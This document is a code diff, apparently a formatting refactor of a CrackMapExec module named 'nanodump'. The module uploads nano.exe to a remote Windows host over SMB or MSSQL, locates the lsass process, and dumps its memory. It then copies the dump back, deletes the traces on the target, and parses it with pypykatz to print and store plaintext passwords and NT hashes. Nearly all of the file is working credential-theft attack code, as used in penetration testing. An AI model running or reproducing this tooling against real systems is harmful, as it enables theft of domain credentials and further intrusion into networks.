@@ -9,25 +9,36 @@ import sys
 import os
 from datetime import datetime
 from pypykatz.pypykatz import pypykatz
-
 from cme.helpers.bloodhound import add_user_bh
 from cme.protocols.mssql.mssqlexec import MSSQLEXEC
 
-class CMEModule:
 
-    name = 'nanodump'
+class CMEModule:
+    name = "nanodump"
     description = "Get lsass dump using nanodump and parse the result with pypykatz"
-    supported_protocols = ['smb', 'mssql']
-    opsec_safe = True # not really
+    supported_protocols = ["smb", "mssql"]
+    opsec_safe = False
     multiple_hosts = True
+    
+    def __init__(self, context=None, module_options=None):
+        self.dir_result = None
+        self.tmp_dir = None
+        self.useembeded = None
+        self.nano = None
+        self.nano_path = None
+        self.nano_embedded64 = None
+        self.tmp_share = None
+        self.share = None
+        self.context = context
+        self.module_options = module_options
 
     def options(self, context, module_options):
-        '''
-            TMP_DIR             Path where process dump should be saved on target system (default: C:\\Windows\\Temp\\)
-            NANO_PATH           Path where nano.exe is on your system (default: /tmp/cme/)
-            NANO_EXE_NAME       Name of the nano executable (default: nano.exe)
-            DIR_RESULT          Location where the dmp are stored (default: DIR_RESULT = NANO_PATH)
-        '''
+        """
+        TMP_DIR             Path where process dump should be saved on target system (default: C:\\Windows\\Temp\\)
+        NANO_PATH           Path where nano.exe is on your system (default: /tmp/cme/)
+        NANO_EXE_NAME       Name of the nano executable (default: nano.exe)
+        DIR_RESULT          Location where the dmp are stored (default: DIR_RESULT = NANO_PATH)
+        """
 
         self.tmp_dir = "C:\\Windows\\Temp\\"
         self.share = "C$"
@@ -44,8 +55,8 @@ class CMEModule:
         else:
             if sys.platform == "win32":
                 appdata_path = os.getenv('APPDATA')
-                if not os.path.exists(appdata_path+"\CME"):
-                    os.mkdir(appdata_path+"\CME")
+                if not os.path.exists(appdata_path + "\CME"):
+                    os.mkdir(appdata_path + "\CME")
                 self.nano_path = appdata_path + "\CME\\"
             else:
                 if not os.path.exists("/tmp/cme/"):
@@ -65,7 +76,7 @@ class CMEModule:
             self.dir_result = module_options['DIR_RESULT']       
 
     def on_admin_login(self, context, connection):
-        if self.useembeded == True:
+        if self.useembeded:
             with open(self.nano_path + self.nano, 'wb') as nano:
                 if connection.os_arch == 32 and context.protocol == 'smb':
                     context.log.display("32-bit Windows detected.")
@@ -83,32 +94,32 @@ class CMEModule:
             with open(self.nano_path + self.nano, 'rb') as nano:
                 try:
                     connection.conn.putFile(self.share, self.tmp_share + self.nano, nano.read)
-                    context.log.success('Created file {} on the \\\\{}{}'.format(self.nano, self.share, self.tmp_share))
+                    context.log.success(f"Created file {self.nano} on the \\\\{self.share}{self.tmp_share}")
                 except Exception as e:
-                    context.log.error('Error writing file to share {}: {}'.format(self.share, e))
+                    context.log.error(f"Error writing file to share {self.share}: {e}")
         else:
             with open(self.nano_path + self.nano, 'rb') as nano:
                 try:
-                    context.log.display('Copy {} to {}'.format(self.nano, self.tmp_dir))
+                    context.log.display(f"Copy {self.nano} to {self.tmp_dir}")
                     exec_method = MSSQLEXEC(connection.conn)
                     exec_method.put_file(nano.read(), self.tmp_dir + self.nano)
                     if exec_method.file_exists(self.tmp_dir + self.nano):
-                        context.log.success('Created file {} on the remote machine {}'.format(self.nano, self.tmp_dir))
+                        context.log.success(f"Created file {self.nano} on the remote machine {self.tmp_dir}")
                     else:
-                        context.log.error('File does not exist on the remote system.. eror during upload')
+                        context.log.error("File does not exist on the remote system... error during upload")
                         sys.exit(1)
                 except Exception as e:
-                    context.log.error('Error writing file to remote machine directory {}: {}'.format(self.tmp_dir, e))
+                    context.log.error(f"Error writing file to remote machine directory {self.tmp_dir}: {e}")
     
         # get pid lsass
         command = 'tasklist /v /fo csv | findstr /i "lsass"'
-        context.log.display('Getting lsass PID {}'.format(command))
+        context.log.display(f"Getting lsass PID {command}")
         p = connection.execute(command, True)
         pid = p.split(',')[1][1:-1]
         timestamp = datetime.today().strftime('%Y%m%d_%H%M')
-        nano_log_name = '{}.log'.format(timestamp)
-        command = self.tmp_dir + self.nano + ' --pid ' + pid + ' --write ' + self.tmp_dir + nano_log_name
-        context.log.display('Executing command {}'.format(command))
+        nano_log_name = f"{timestamp}.log"
+        command = f"{self.tmp_dir}{self.nano} --pid {pid} --write {self.tmp_dir}{nano_log_name}"
+        context.log.display(f"Executing command {command}")
         p = connection.execute(command, True)
         context.log.debug(p)
         dump = False
@@ -119,46 +130,46 @@ class CMEModule:
             context.log.error('Process lsass.exe error on dump, try with verbose')
         
         if dump:
-            context.log.display('Copying {} to host'.format(nano_log_name))
-            filename = '{}{}_{}_{}.log'.format(self.dir_result,connection.hostname,connection.os_arch,connection.domain)
+            context.log.display(f"Copying {nano_log_name} to host")
+            filename = f"{self.dir_result}{connection.hostname}_{connection.os_arch}_{connection.domain}.log"
             if context.protocol == 'smb':
                 with open(filename, 'wb+') as dump_file:
                     try:
                         connection.conn.getFile(self.share, self.tmp_share + nano_log_name, dump_file.write)
-                        context.log.success('Dumpfile of lsass.exe was transferred to {}'.format(filename))
+                        context.log.success(f"Dumpfile of lsass.exe was transferred to {filename}")
                     except Exception as e:
-                        context.log.error('Error while getting file: {}'.format(e))
+                        context.log.error(f"Error while getting file: {e}")
 
                 try:
                     connection.conn.deleteFile(self.share, self.tmp_share + self.nano)
-                    context.log.success('Deleted nano file on the {} share'.format(self.share))
+                    context.log.success(f"Deleted nano file on the {self.share} share")
                 except Exception as e:
-                    context.log.error('Error deleting nano file on share {}: {}'.format(self.share, e))
+                    context.log.error(f"Error deleting nano file on share {self.share}: {e}")
 
                 try:
                     connection.conn.deleteFile(self.share, self.tmp_share + nano_log_name)
-                    context.log.success('Deleted lsass.dmp file on the {} share'.format(self.share))
+                    context.log.success(f"Deleted lsass.dmp file on the {self.share} share")
                 except Exception as e:
-                    context.log.error('Error deleting lsass.dmp file on share {}: {}'.format(self.share, e))
+                    context.log.error(f"Error deleting lsass.dmp file on share {self.share}: {e}")
             else:
                 try:
                     exec_method = MSSQLEXEC(connection.conn)
                     exec_method.get_file(self.tmp_dir + nano_log_name, filename)
-                    context.log.success('Dumpfile of lsass.exe was transferred to {}'.format(filename))
+                    context.log.success(f"Dumpfile of lsass.exe was transferred to {filename}")
                 except Exception as e:
-                    context.log.error('Error while getting file: {}'.format(e))
+                    context.log.error(f"Error while getting file: {e}")
 
                 try:
-                    connection.execute('del {}'.format(self.tmp_dir + self.nano))
-                    context.log.success('Deleted nano file on the {} dir'.format(self.share))
+                    connection.execute(f"del {self.tmp_dir + self.nano}")
+                    context.log.success(f"Deleted nano file on the {self.share} dir")
                 except Exception as e:
-                    context.log.error('Error deleting nano file on dir {}: {}'.format(self.tmp_dir, e))
+                    context.log.error(f"Error deleting nano file on dir {self.tmp_dir}: {e}")
 
                 try:
-                    connection.execute('del {}'.format(self.tmp_dir + nano_log_name))
-                    context.log.success('Deleted lsass.dmp file on the {} dir'.format(self.tmp_dir))
+                    connection.execute(f"del {self.tmp_dir + nano_log_name}")
+                    context.log.success(f"Deleted lsass.dmp file on the {self.tmp_dir} dir")
                 except Exception as e:
-                    context.log.error('Error deleting lsass.dmp file on dir {}: {}'.format(self.tmp_dir, e))
+                    context.log.error(f"Error deleting lsass.dmp file on dir {self.tmp_dir}: {e}")
 
             fh = open(filename, "r+b")
             fh.seek(0)
@@ -171,16 +182,23 @@ class CMEModule:
             
             with open(filename, 'rb') as dump:
                 try:
-                    credentials = []
-                    credz_bh = []
+                    bh_creds = []
                     try:
                         pypy_parse = pypykatz.parse_minidump_external(dump)
                     except Exception as e:
                         pypy_parse = None
                         context.log.error(f'Error parsing minidump: {e}')
 
-                    ssps = ['msv_creds', 'wdigest_creds', 'ssp_creds', 'livessp_creds', 'kerberos_creds', 'credman_creds',
-                            'tspkg_creds']
+                    ssps = [
+                        'msv_creds',
+                        'wdigest_creds',
+                        'ssp_creds',
+                        'livessp_creds',
+                        'kerberos_creds',
+                        'credman_creds',
+                        'tspkg_creds'
+                    ]
+
                     for luid in pypy_parse.logon_sessions:
                         for ssp in ssps:
                             for cred in getattr(pypy_parse.logon_sessions[luid], ssp, []):
@@ -197,13 +215,19 @@ class CMEModule:
                                     else:
                                         credtype = "hash"
                                         credential = NThash
-                                    context.log.highlight(domain + "\\" + username + ":" + credential)
-                                    hostid = context.db.get_hosts(connection.host)[0][0]
-                                    context.db.add_credential(credtype, connection.domain, username, credential, pillaged_from=hostid)
+                                    context.log.highlight(f"{domain}\\{username}:{credential}")
+                                    host_id = context.db.get_hosts(connection.host)[0][0]
+                                    context.db.add_credential(
+                                        credtype,
+                                        connection.domain,
+                                        username,
+                                        credential,
+                                        pillaged_from=host_id
+                                    )
                                     if "." not in domain and domain.upper() in connection.domain.upper():
                                         domain = connection.domain
-                                        credz_bh.append({'username': username.upper(), 'domain': domain.upper()})
-                    if len(credz_bh) > 0:
-                        add_user_bh(credz_bh, None, context.log, connection.config)
+                                        bh_creds.append({'username': username.upper(), 'domain': domain.upper()})
+                    if len(bh_creds) > 0:
+                        add_user_bh(bh_creds, None, context.log, connection.config)
                 except Exception as e:
-                    context.log.error('Error openning dump file', str(e))
+                    context.log.error(f"Error opening dump file: {e}")
